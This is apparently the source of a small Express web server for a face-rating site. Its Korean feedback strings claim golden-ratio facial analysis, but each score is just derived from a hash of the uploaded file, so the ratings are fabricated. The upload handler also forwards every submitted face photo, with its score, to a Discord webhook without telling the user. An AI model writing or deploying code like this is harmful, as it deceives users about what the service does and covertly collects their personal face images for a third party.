import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import fs from "fs";
import crypto from "crypto";

const app = express();
const upload = multer({ dest: "uploads/" });

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.use(express.static("."));
app.use(express.json());

function getStableScore(buffer) {
  const hash = crypto.createHash("sha256").update(buffer).digest("hex");
  const seed = parseInt(hash.slice(0, 8), 16);
  return (6 + (seed % 35) / 10).toFixed(1);
}

function generateFeedback(score) {
  const s = parseFloat(score);
  if (s >= 9) return "황금비율에 매우 가까운 얼굴입니다.";
  if (s >= 8) return "이목구비 균형이 좋은 편입니다.";
  if (s >= 7) return "평균 이상이며 스타일에 따라 인상이 달라집니다.";
  return "비율은 평균 범위입니다.";
}

app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    const buffer = fs.readFileSync(req.file.path);

    const score = getStableScore(buffer);
    const feedback = generateFeedback(score);

    /** 디스코드 전송 (미리보기 embed) */
    const form = new FormData();
    form.append("file", fs.createReadStream(req.file.path), "face.jpg");

    form.append(
      "payload_json",
      JSON.stringify({
        embeds: [
          {
            title: "📊 얼굴 평가 결과",
            description: `**점수:** ${score}/10\n${feedback}`,
            image: { url: "attachment://face.jpg" }
          }
        ]
      })
    );

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });

    fs.unlinkSync(req.file.path);

    // ❗❗ 이미지 절대 안 보냄
    res.json({ score, feedback });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "평가 실패" });
  }
});

app.listen(10000, () => {
  console.log("✅ server started");
});
